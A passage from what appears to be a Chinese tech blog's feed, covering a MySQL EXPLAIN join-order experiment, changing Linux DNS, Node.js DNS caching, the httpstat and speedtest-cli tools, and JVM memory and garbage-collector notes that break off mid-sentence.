filesort</td></tr><tr><td>2</td><td>DERIVED</td><td>like</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td>Using temporary; Using filesort</td></tr></tbody></table><h4 id="实验3"><a href="#实验3" class="headerlink" title="实验3"></a>实验3</h4><blockquote><p>调整子句顺序(10,11 -&gt; 8,9) 对比实验2</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">explain <span class="keyword">select</span></span><br><span class="line">    template.id <span class="keyword">as</span> <span class="string">&#x27;id&#x27;</span>, ifnull(likes.total, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;likes&#x27;</span>, ifnull(ratings.stars, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;ratings&#x27;</span>, ifnull(rating.star, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;rating&#x27;</span>, if(isnull(iLike.id), <span class="number">0</span>, <span class="number">1</span>) <span class="keyword">as</span> <span class="string">&#x27;isLike&#x27;</span></span><br><span class="line"><span class="keyword">from</span> template</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">as</span> total <span class="keyword">from</span> `<span class="keyword">like</span>` <span class="keyword">group</span> <span class="keyword">by</span> template_id) <span class="keyword">as</span> likes</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> likes.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">avg</span>(star) <span class="keyword">as</span> <span class="string">&#x27;stars&#x27;</span> <span class="keyword">from</span> rating <span class="keyword">group</span> <span class="keyword">by</span> template_id) ratings</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> ratings.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> rating</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> rating.template_id <span class="keyword">and</span> rating.user_id <span class="operator">=</span> <span class="number">10000</span></span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">like</span>` <span class="keyword">as</span> iLike</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> iLike.template_id <span class="keyword">and</span> iLike.user_id <span class="operator">=</span> <span class="number">10000</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>id</th><th>select_type</th><th>table</th><th>type</th><th>possible_keys</th><th>key</th><th>key_len</th><th>ref</th><th>rows</th><th>Extra</th></tr></thead><tbody><tr><td>1</td><td>PRIMARY</td><td>template</td><td>index</td><td>NULL</td><td>PRIMARY</td><td>4</td><td>NULL</td><td>65</td><td>Using index</td></tr><tr><td>1</td><td>PRIMARY</td><td>derived2</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>derived3</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>iLike</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>3</td><td>DERIVED</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td>Using temporary; Using filesort</td></tr><tr><td>2</td><td>DERIVED</td><td>like</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td>Using temporary; Using filesort</td></tr></tbody></table><ol><li>表连接中有子查询的先执行(对比实验1、2、3)，相同情况下排在后面的优先级高(对比实验1、2)。</li><li>表连接，从上到下执行(对比实验2、3)</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/Yhzhtk/note/issues/39">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>修改DNS</title>
      <link href="/post/modify-dns.html"/>
      <url>/post/modify-dns.html</url>
      
        <content type="html"><![CDATA[<h3 id="Linux临时或永久修改DNS"><a href="#Linux临时或永久修改DNS" class="headerlink" title="Linux临时或永久修改DNS"></a>Linux临时或永久修改DNS</h3><h3 id="临时修改DNS"><a href="#临时修改DNS" class="headerlink" title="临时修改DNS"></a>临时修改DNS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/resolv.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nameserver 114.114.114.114 #修改成你的主DNS</span><br><span class="line">nameserver 114.114.115.115 #修改成你的备用DNS</span><br><span class="line">search localhost #你的域名</span><br></pre></td></tr></table></figure><p>输入<code>:wq</code>保存退出</p><h3 id="永久修改网卡"><a href="#永久修改网卡" class="headerlink" title="永久修改网卡"></a>永久修改网卡</h3><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nodejs-dns-cache</title>
      <link href="/post/nodejs-dns-cache.html"/>
      <url>/post/nodejs-dns-cache.html</url>
      
        <content type="html"><![CDATA[<h3 id="Node-js-DNS缓存"><a href="#Node-js-DNS缓存" class="headerlink" title="Node.js DNS缓存"></a>Node.js DNS缓存</h3><p>Node.js默认不会缓存DNS信息，如果需要发大量请求时，使用带缓存的<code>dns.lookup</code>可以提高性能。  </p><p><em>lookup只支持http，https不会生效</em></p><p><img src="/images/QQ20170118-0@2x.jpg"></p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><h4 id="使用http模块"><a href="#使用http模块" class="headerlink" title="使用http模块"></a>使用http模块</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> dns = <span class="built_in">require</span>(<span class="string">&#x27;dnscache&#x27;</span>)(&#123;</span><br><span class="line">    <span class="attr">enable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">ttl</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="attr">cachesize</span>: <span class="number">1000</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">    <span class="attr">hostname</span>: <span class="string">&#x27;www.baidu.com&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">80</span>,</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/fe0a164b-06f9-4d27-a689-c554e69a9d82.jpg&#x27;</span>,</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">lookup</span>: dns.<span class="property">lookup</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> req = http.<span class="title function_">request</span>(options, <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`STATUS: <span class="subst">$&#123;res.statusCode&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`HEADERS: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(res.headers)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// res.setEncoding(&#x27;utf8&#x27;);</span></span><br><span class="line">    res.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// console.log(`BODY: $&#123;chunk&#125;`);</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;No more data in response.&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">req.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`problem with request: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write data to request body</span></span><br><span class="line">req.<span class="title function_">end</span>();</span><br></pre></td></tr></table></figure><h4 id="使用request模块"><a href="#使用request模块" class="headerlink" title="使用request模块"></a>使用request模块</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> dns = <span class="built_in">require</span>(<span class="string">&#x27;dnscache&#x27;</span>)(&#123;</span><br><span class="line">    <span class="attr">enable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">ttl</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="attr">cachesize</span>: <span class="number">1000</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">request = request.<span class="title function_">defaults</span>(&#123;</span><br><span class="line">    <span class="attr">lookup</span>: dns.<span class="property">lookup</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">request.<span class="title function_">get</span>(<span class="string">&#x27;http://www.baidu.com/fe0a164b-06f9-4d27-a689-c554e69a9d82.jpg&#x27;</span>, <span class="keyword">function</span> (<span class="params">error, response, body</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (error) <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;request failed:&#x27;</span>, error);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`STATUS: <span class="subst">$&#123;response.statusCode&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`HEADERS: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(response.headers)&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://nodejs.org/api/net.html#net_socket_connect_options_connectlistener">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>httpstat</title>
      <link href="/post/httpstat.html"/>
      <url>/post/httpstat.html</url>
      
        <content type="html"><![CDATA[<h3 id="httpstat-HTTP-响应的可视化命令行工具"><a href="#httpstat-HTTP-响应的可视化命令行工具" class="headerlink" title="httpstat - HTTP 响应的可视化命令行工具"></a>httpstat - HTTP 响应的可视化命令行工具</h3><p><img src="/images/QQ20170117-0@2x.jpg"></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install httpstat</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpstat http://www.baidu.com</span><br></pre></td></tr></table></figure><p>整個網路連線所耗費的時間分為四段：</p><p>DNS Lookup：DNS 名稱解析所耗費的時間。<br>TCP Connection：實際與網頁伺服器建立 TCP 連線所耗費的時間。<br>Server Processing：網頁伺服器在處理網頁請求所耗費的時間。<br>Content Transfer：傳送網頁內容至瀏覽器所耗費的時間。<br>從這個報表我們就可以大約看出網站目前的運行情況是否正常。   </p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://gold.xitu.io/entry/57c7a11d0e3dd9006a28a7ca">【1】</a> <a href="https://blog.gtwang.org/linux/httpstat-curl-statistics-tool-to-check-website-performance/">【2】</a> <a href="https://linux.cn/article-8039-1.html">【3】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网速测试</title>
      <link href="/post/speedtest.html"/>
      <url>/post/speedtest.html</url>
      
        <content type="html"><![CDATA[<h3 id="Speedtest"><a href="#Speedtest" class="headerlink" title="Speedtest"></a>Speedtest</h3><p>Speedtest.net强大而知名的全球宽带网络速度测试网站，采用Flash载入界面，Alexa世界排名非常高。Speedtest.net在全球有数百个测试节点，国内有测速节点几十个。作为一款在线并且可视化的网速测试工具。使用方法简单，无需下载、安装多余软件，只需有浏览器即可。   </p><p>Speedtest.net还推出了命令行下测速工具speedtest-cli。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install speedtest-cli</span><br></pre></td></tr></table></figure><p>安装完成后，直接在命令行输入命令即可测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">speedtest-cli</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.geekfan.net/5521/">【1】</a> <a href="https://github.com/sivel/speedtest-cli">【2】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java虚拟机</title>
      <link href="/post/jvm.html"/>
      <url>/post/jvm.html</url>
      
        <content type="html"><![CDATA[<h2 id="Java虚拟机"><a href="#Java虚拟机" class="headerlink" title="Java虚拟机"></a>Java虚拟机</h2><h3 id="Java内存区域"><a href="#Java内存区域" class="headerlink" title="Java内存区域"></a>Java内存区域</h3><ul><li><p>程序计数器</p><p>  程序计数器（Program Counter Register）是一块较小的内存空间，它可以看作是当前线程所执行的字节码的行号指示器。在虚拟机的概念模型里（仅是概念模型，各种虚拟机可能会通过一些更高效的方式去实现），字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成。</p></li><li><p>Java虚拟机栈</p><p>  与程序计数器一样，Java虚拟机栈（Java Virtual Machine Stacks）也是线程私有的，它的生命周期与线程相同。虚拟机栈描述的是Java方法执行的内存模型：每个方法在执行的同时都会创建一个栈帧（Stack Frame[1]）用于存储<strong>局部变量表</strong>、操作数栈、动态链接、方法出口等信息。每一个方法从调用直至执行完成的过程，就对应着一个栈帧在虚拟机栈中入栈到出栈的过程。</p><p>  如果线程请求的栈深度大于虚拟机所允许的深度，将抛出<code>StackOverflowError</code>异常，这个在递归时可能会发生。如果栈空间支持动态扩展，当无法申请到足够内存是也会抛出<code>OutOfMemoryError</code>异常。</p><p>  使用设置<code>-Xss</code>可以设置栈大小。虚拟机栈是线程独有的，每个线程分配到的栈容量越大，可以建立的线程数量自然就越少，建立线程时就越容易把剩下的内存耗尽。</p></li><li><p>本地方法栈</p><p>  本地方法栈与虚拟机栈类似，只是这里虚拟机使用到的Native方法服务。这里同样可能会抛出<code>StackOverflowError</code>和<code>OutOfMemoryError</code>异常。</p></li><li><p>Java堆</p><p>  Java堆是Java里面最大的一块内存。Java堆是被所有线程共享的一块内存区域，在虚拟机启动时创建。此内存区域的唯一目的就是存放对象实例。垃圾回收也主要在堆去进行。</p><p>  使用<code>-Xms</code>和<code>-Xmx</code>来设置堆的初始和最大大小，很多软件都建议将两者设置的一样大。</p><p>  如果申请不到足够的内存这里会抛出<code>OutOfMemoryError</code>异常，后面会跟着进一步提示”Java heap space”。</p><p>  <code>TLAB</code>全称ThreadLocalAllocBuffer，是线程的一块私有内存。如果设置了虚拟机参数 -XX:UseTLAB，在线程初始化时，同时也会申请一块指定大小的内存，只给当前线程使用，这样每个线程都单独拥有一个Buffer。如果需要分配内存，就在自己的Buffer上分配，这样就不存在竞争的情况，<strong>可以大大提升分配效率</strong>（均摊对GC堆（eden区）里共享的分配指针做更新而带来的同步开销。），当Buffer容量不够的时候，再重新从Eden区域申请一块继续使用，这个申请动作还是需要原子操作的。TLAB只是让每个线程有私有的分配指针，但底下存对象的内存空间还是给所有线程访问的，只是其它线程无法在这个区域分配而已。可以通过<code>-XX:+/-UseTLAB</code>参数来设定。</p></li><li><p>方法区</p><p>  这里主要<strong>类信息</strong>、<em>常量</em>（不同版本的虚拟机常量存储地方可能不同）、静态变量、即时编译器编译后的代码等数据。</p><p>  运行时常量池（Runtime Constant Pool）是方法区的一部分。Class文件中除了有类的版本、字段、方法、接口等描述信息外，还有一项信息是常量池（Constant Pool Table），用于存放编译期生成的各种字面量和符号引用，这部分内容将在类加载后进入方法区的运行时常量池中存放。</p><p>  对于需要大量动态生成类的框架（Spring）这里可能会发生内存溢出，后面会提示”PermGen space”。</p><p>  使用<code>-XX:PermSize</code>设置初始大小，<code>-XX:MaxPermSize</code>设置方法区内存上限。</p><blockquote><p>从Java8开始使用<code>-XX:MetaspaceSize</code>和<code>-XX:MaxMetaspaceSize</code>设置。</p></blockquote></li><li><p>直接内存</p><p>  直接内存（Direct Memory）并不是虚拟机运行时数据区的一部分。从Java1.4 NIO开始，我们可以直接使用堆外内存。<code>DirectByteBuffer</code>对象作为对这部分内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java堆和Native堆中来回复制数据。</p><p>  堆内存不受Java虚拟机堆内存限制，但是它会受到本机总内存限制。当内存不足是会发生<code>OutOfMemoryError</code>异常。</p><p>  使用<code>-XX:MaxDirectMemorySize</code>设置，如果不指定默认和<code>-Xmx</code>一样大。</p></li></ul><h3 id="Java内存模型"><a href="#Java内存模型" class="headerlink" title="Java内存模型"></a>Java内存模型</h3><p>Java虚拟机规范中试图定义一种Java内存模型（Java Memory Model,JMM）来屏蔽掉各种硬件和操作系统的内存访问差异，以实现让Java程序在各种平台下都能达到一致的内存访问效果。主流程序语言（如C&#x2F;C++等）直接使用物理硬件和操作系统的内存模型，因此，会由于不同平台上内存模型的差异，有可能导致程序在一套平台上并发完全正常，而在另外一套平台上并发访问却经常出错，因此在某些场景就必须针对不同的平台来编写程序。</p><p>Java内存模型的主要目标是定义程序中各个变量的访问规则，即在虚拟机中将变量存储到内存和从内存中取出变量这样的底层细节。</p><p>Java内存模型规定了所有的变量都存储在主内存（Main Memory）中。每条线程还有自己的工作内存（Working Memory），线程的工作内存中保存了被该线程使用到的变量的主内存副本拷贝，线程对变量的所有操作（读取、赋值等）都必须在工作内存中进行，而不能直接读写主内存中的变量。不同的线程之间也无法直接访问对方工作内存中的变量，线程间变量值的传递均需要通过主内存来完成。</p><blockquote><p>Java内存模型和上面的Java内存区域不是一个级别的概念。</p></blockquote><p><img src="/images/java-memory-model.png"></p><ul><li><p>可见性</p><p>  由于每条线程只能直接读取、修改工作内存，工作内存和主存数据机会存在不一致的情况。</p></li><li><p>指令重排</p><p>  CPU和编译器为了提升程序执行的效率，会按照一定的规则允许进行指令优化。指令重排会保证单线程执行结果不会改变。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> <span class="number">4</span>;            <span class="comment">// 1.1 </span></span><br><span class="line"><span class="type">int</span> <span class="variable">pi</span> <span class="operator">=</span> <span class="number">3.14</span>;        <span class="comment">// 1.2</span></span><br><span class="line"><span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> pi * r * r;   <span class="comment">// 1.3</span></span><br></pre></td></tr></table></figure><p>  这段代码实际执行时可能是 <code>1.1 -&gt; 1.2 -&gt; 1.3</code>，也可能会是 <code>1.2 -&gt; 1.1 -&gt; 1.3</code>。只要逻辑上没有依赖关系，不影响最终结果的都可能会重排。</p></li><li><p>内存屏障</p><p>  在多线程环境里需要使用某种技术来使程序结果尽快可见。一旦内存数据被推送到缓存，就会有消息协议来确保所有的缓存会对所有的共享数据同步并保持一致。这个使内存数据对CPU核可见的技术被称为内存屏障或内存栅栏。内存屏障之前的所有写操作都要写入内存；内存屏障之后的读操作都可以获得同步屏障之前的写操作的结果。因此，对于敏感的程序块，写操作之后、读操作之前可以插入内存屏障。</p></li></ul><h3 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h3><p>垃圾回收的优点是程序员不需要再手动去管理内存了，它的缺点是在回收过程中程序会出现短暂暂停，这在某些场景下是不能允许的。</p><blockquote><p>在标记阶段必须要暂停一定的时间来遍历<code>GC Roots</code>链，不可以出现分析过程中对象引用关系还在不断变化的情况，该点不满足的话分析结果准确性就无法得到保证。</p></blockquote><h4 id="GC主要算法"><a href="#GC主要算法" class="headerlink" title="GC主要算法"></a>GC主要算法</h4><ol><li><p>引用计数算法</p><p> 给对象中添加一个引用计数器，每当有一个地方引用它时，计数器值就加1；当引用失效时，计数器值就减1；任何时刻计数器为0的对象就是不可能再被使用的。</p><p> 引用计数算法有可以立即回收、不用遍历整个堆等优点，但是它比较少使用，因为它有个很大的缺点是不能解决相互依赖问题。</p></li><li><p>标记-清除算法</p><p> 标记清除算法分为两个阶段，标记和清除。第一阶段使用可达性分析算法从<code>GC Roots</code>作为起点开始搜索。当一个对象到GC Roots没有任何引用链相连时，则证明此对象是不可用的，它们将会被判定为是可回收的对象。</p><p> 首先标记出所有需要回收的对象，在标记完成后统一回收所有被标记的对象。这种算法有个缺点，清除后内存上会有大量空洞，存在大量不连续的空间。如果分配较大内存的对象时可能会出现内存问题。为了解决这个问题，在这个基础上人们又提出了下面的复制算法。</p></li><li><p>GC复制算法</p><p> 复制算法将内存分为大小相同的两块，每次只是用其中一块。当其中一块满了以后将里面存活的对象全部复制到另一块去，然后将这块内存全部清理掉。这种算法的缺点就是每次只能使用一半内存，存在一些浪费的问题。</p><p> 根据研究表名，大部分新对象经过一次GC就会被回收掉，所以不需要按照1:1的比例来划分两块内存，而是将内存分为一份较大的<code>Eden</code>空间和两份<code>Survivor</code>空间。每次只使用<code>Eden</code>和一份<code>Survivor</code>空间，当回收时将<code>Eden</code>和正在使用的<code>Survivor</code>空间里面存活的对象全都复制到另一个<code>Survivor</code>空间中。然后一次性清理掉原来的<code>Eden</code>和<code>Survivor</code>空间。这样每次只浪费一份<code>Survivor</code>的内存，HotSpot虚拟机默认Eden和Survivor的大小比例是8:1，也就是说每次只浪费10%的内存空间。</p></li><li><p>标记-整理算法</p><p> 标记整理算法是在上述算法基础上发展而来的。它会使用整个内存，标记阶段完成后将存活的对象朝内存的一端移动，然后直接清理掉端边界以外的内存。</p></li></ol><h4 id="Java中的GC"><a href="#Java中的GC" class="headerlink" title="Java中的GC"></a>Java中的GC</h4><p><code>HotSpot</code>（包括其它主流虚拟机）都采用<code>分代收集</code>的策略，这主要是因为新对象和老对象存活周期不同。一般的新对象普遍在一轮GC后就被回收了，如果对象经过两轮GC还活着那可能这个对象还会存活很久。对象存活周期不同，这就使我们在进行垃圾回收时选择不同的策略来回收两种对象。</p><p><code>HotSpot</code>中有几种垃圾回收器，不同的垃圾回收器使用了不同的算法。</p><p><img src="/images/garbage-collector.png"></p><ul><li><p>Serial收集器</p><p>  Serial收集器是最古老的收集器，它的缺点是当Serial收集器想进行垃圾回收的时候，必须暂停用户的所有进程，即<code>stop the world</code>。到现在为止，它依然是虚拟机运行在client模式下的默认新生代收集器，与其他收集器相比，对于限定在单个CPU的运行环境来说，Serial收集器由于没有线程交互的开销，专心做垃圾回收自然可以获得最高的单线程收集效率。</p><p>  Serial Old是Serial收集器的老年代版本，它同样是一个单线程收集器，使用<code>标记－整理</code>算法。这个收集器的主要意义也是被Client模式下的虚拟机使用。在Server模式下，它主要还有两大用途：一个是在JDK1.5及以前的版本中与Parallel Scanvenge收集器搭配使用，另外一个就是作为CMS收集器的后备预案，在并发收集发生Concurrent Mode Failure的时候使用。</p><p>  通过指定<code>-XX:-UseSerialGC</code>参数，使用Serial + Serial Old的串行收集器组合进行内存回收。</p></li><li><p>ParNew收集器</p><p>  ParNew收集器是Serial收集器新生代的多线程实现，注意在进行垃圾回收的时候依然会<code>stop the world</code>，只是相比较Serial收集器而言它会运行多条线程进行垃圾回收。</p><p>  ParNew收集器在单CPU的环境中绝对不会有比Serial收集器更好的效果，甚至由于存在线程交互的开销，该收集器在通过超线程技术实现的两个CPU的环境中都不能百分之百的保证能超越Serial收集器。当然，随着可以使用的CPU的数量增加，它对于GC时系统资源的利用还是很有好处的。它默认开启的收集线程数与CPU的数量相同，在CPU非常多（譬如32个，现在CPU动辄4核加超线程，服务器超过32个逻辑CPU的情况越来越多了）的环境下，可以使用<code>-XX:ParallelGCThreads</code>参数来限制垃圾收集的线程数。</p><p>  <code>-XX:-UseParNewGC</code>打开此开关后，使用ParNew + Serial Old的收集器组合进行内存回收，这样新生代使用并行收集器，老年代使用串行收集器。如果配置<code>-XX:+UseConcMarkSweepGC</code>选项后的默认新生代收集器也是ParNew收集器。</p></li><li><p>Parallel Scavenge收集器</p><p>  Parallel是采用复制算法的多线程新生代垃圾回收器，似乎和ParNew收集器有很多的相似的地方。但是Parallel Scanvenge收集器的一个特点是它所关注的目标是<strong>吞吐量</strong>(Throughput)。所谓吞吐量就是CPU用于运行用户代码的时间与CPU总消耗时间的比值，即<code>吞吐量 = 运行用户代码时间 / (运行用户代码时间 + 垃圾收集时间)</code>，虚拟机总共运行了100分钟，其中垃圾收集花掉1分钟，那吞吐量就是99%。Parallel Old收集器是Parallel Scavenge收集器的老年代版本，采用多线程和<code>标记－整理</code>算法。这个收集器是在jdk1.6中才开始提供的，在此之前，新生代的Parallel Scavenge收集器一直处于比较尴尬的状态。原因是如果新生代Parallel Scavenge收集器，那么老年代除了Serial Old(PS MarkSweep)收集器外别无选择。由于单线程的老年代Serial Old收集器在服务端应用性能上的”拖累”，即使使用了Parallel Scavenge收集器也未必能在整体应用上获得吞吐量最大化的效果，又因为老年代收集中无法充分利用服务器多CPU的处理能力，在老年代很大而且硬件比较高级的环境中，这种组合的吞吐量甚至还不一定有ParNew加CMS的组合”给力”。直到Parallel Old收集器出现后，”吞吐量优先”收集器终于有了比较名副其实的应用，在注重吞吐量及CPU资源敏感的场合，都可以优先考虑Parallel Scavenge加Parallel Old收集器。</p><p>  Parallel Scavenge收集器提供了两个参数用于精确控制吞吐量，分别是控制最大垃圾收集停顿时间的<code>-XX:MaxGCPauseMillis</code>参数以及直接设置吞吐量大小的<code>-XX:GCTimeRatio</code>参数。</p><p>  <code>-XX:UseParallelGC</code>虚拟机运行在Server模式下的默认值，打开此开关后，使用Parallel Scavenge + Serial Old的收集器组合进行内存回收。<code>-XX:UseParallelOldGC</code>打开此开关后，使用Parallel Scavenge + Parallel Old的收集器组合进行垃圾回收。</p></li><li><p>CMS收集器</p><p>  CMS(Concurrent Mark Swep)收集器是一个比较重要的回收器，现在应用非常广泛，我们重点来看一下，CMS一种获取最短回收停顿时间为目标的收集器，这使得它很适合用于和用户交互的业务。从名字(Mark Swep)就可以看出，CMS收集器是基于标记清除算法实现的。它的收集过程分为四个步骤：</p><ol><li>初始标记(initial mark)</li><li>并发标记(concurrent mark)</li><li>重新标记(remark)</li><li>并发清除(concurrent sweep)</li></ol><p>  注意初始标记和重新标记还是会stop the world，但是在耗费时间更长的并发标记和并发清除两个阶段都可以和用户进程同时工作。</p><p>  不过由于CMS收集器是基于标记清除算法实现的，会导致有大量的空间碎片产生，在为大对象分配内存的时候，往往会出现老年代还有很大的空间剩余，但是无法找到足够大的连续空间来分配当前对象，不得不提前开启一次Full 